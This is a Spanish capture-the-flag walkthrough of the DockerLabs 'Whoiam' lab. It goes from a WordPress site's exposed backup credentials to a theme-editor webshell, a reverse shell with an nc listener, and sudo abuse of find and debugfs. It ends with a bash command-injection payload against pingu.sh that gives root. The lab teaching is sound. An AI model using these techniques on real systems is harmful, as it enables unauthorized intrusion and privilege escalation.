@@ -1,0 +1,247 @@
+---
+title: Whoiam
+description: Resolución completa de la máquina virtual *Whoiam* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Whoiam**, desarrollada por *Pylon* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con WordPress y un directorio `/backups` accesible públicamente que contiene un archivo ZIP con credenciales en texto plano. Estas credenciales permiten acceder al panel de administración de WordPress, desde donde se sube una webshell para obtener ejecución remota de comandos como `www-data`.
+Una vez dentro, se encadenan múltiples configuraciones inseguras de `sudo`: `www-data` puede ejecutar `find` como `rafa`, `rafa` puede ejecutar `debugfs` como `ruben`, y `ruben` puede ejecutar un script `pingu.sh` como root mediante una inyección de comandos, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Whoiam',
+    Autor: 'Pylon',
+    Dificultad: 'Fácil',
+    Fecha: '09/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Whoiam.zip
+sudo bash auto_deploy.sh Whoiam.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/Ip_leisoz.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Whoiam/{content,exploits,nmap,scripts}
+cd Whoiam
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762388364/Ports_pyerjs.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762388364/Gobuster_rpgciu.png)
+
+**Rutas relevantes:**
+- `/index.php` — Página principal de WordPress.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/Index_yljlnv.png)
+- `/backups` — Directorio accesible públicamente.
+  ![Backups](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/Backups_zzw3rs.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Extracción de credenciales
+
+En el directorio `/backups` se encuentra el archivo `databaseback2may.zip`. Se descomprime:
+
+```bash
+7z x databaseback2may.zip
+```
+
+El respaldo contiene credenciales en texto plano:
+
+![Database](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/Database_tkmda4.png)
+
+### 2.2 Acceso al panel de WordPress
+
+Con las credenciales obtenidas, se accede a:
+
+```
+http://172.17.0.2/wp-admin
+```
+
+![Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/DashboardWps_gl45hp.png)
+
+### 2.3 Subida de webshell
+
+Se edita un theme y se añade una webshell:
+
+![Edit Theme](https://res.cloudinary.com/dewqswzke/image/upload/v1762388363/EditTheme_exzy6t.png)
+
+Se prueba la ejecución:
+
+![Webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1762388370/WebShell_jx1u3t.png)
+
+### 2.4 Reverse shell
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload para obtener una reverse shell:
+
+![Reverse](https://res.cloudinary.com/dewqswzke/image/upload/v1762388366/Reverse_y18geh.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → rafa
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1762388369/Sudo-lWWW-data_uav9kt.png)
+
+Se puede ejecutar `find` como `rafa`:
+
+```bash
+sudo -u rafa find . -exec /bin/sh \; -quit
+```
+
+![Rafa](https://res.cloudinary.com/dewqswzke/image/upload/v1762388365/Rafa_s58nfq.png)
+
+### 3.2 De rafa → ruben
+
+Se verifican los permisos sudo de `rafa`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l rafa](https://res.cloudinary.com/dewqswzke/image/upload/v1762388366/Sudo-lRafa_d24kdx.png)
+
+Se puede ejecutar `debugfs` como `ruben`:
+
+```bash
+sudo -u ruben debugfs
+!/bin/bash
+```
+
+![Ruben](https://res.cloudinary.com/dewqswzke/image/upload/v1762388366/Ruben_lk7ieq.png)
+
+### 3.3 De ruben → root
+
+Se verifican los permisos sudo de `ruben`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l ruben](https://res.cloudinary.com/dewqswzke/image/upload/v1762388369/Sudo-lRuben_m0bdqb.png)
+
+Se puede ejecutar el script `pingu.sh` como root. El script no valida adecuadamente la entrada:
+
+```bash
+a[$(/bin/bash>&2)]+42
+```
+
+![Penguin code](https://res.cloudinary.com/dewqswzke/image/upload/v1762388364/PenguinCode_tkhmge.png)
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762388366/Root_zlgjht.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Directorio /backups expuesto con credenciales en texto plano",
+      severity: "Crítica",
+      impact: "Acceso al panel de administración de WordPress"
+    },
+    {
+      vulnerability: "Editor de temas habilitado en WordPress",
+      severity: "Crítica",
+      impact: "Subida de webshell y ejecución remota de comandos"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en find",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario rafa"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en debugfs",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario ruben"
+    },
+    {
+      vulnerability: "Script pingu.sh vulnerable a inyección de comandos",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
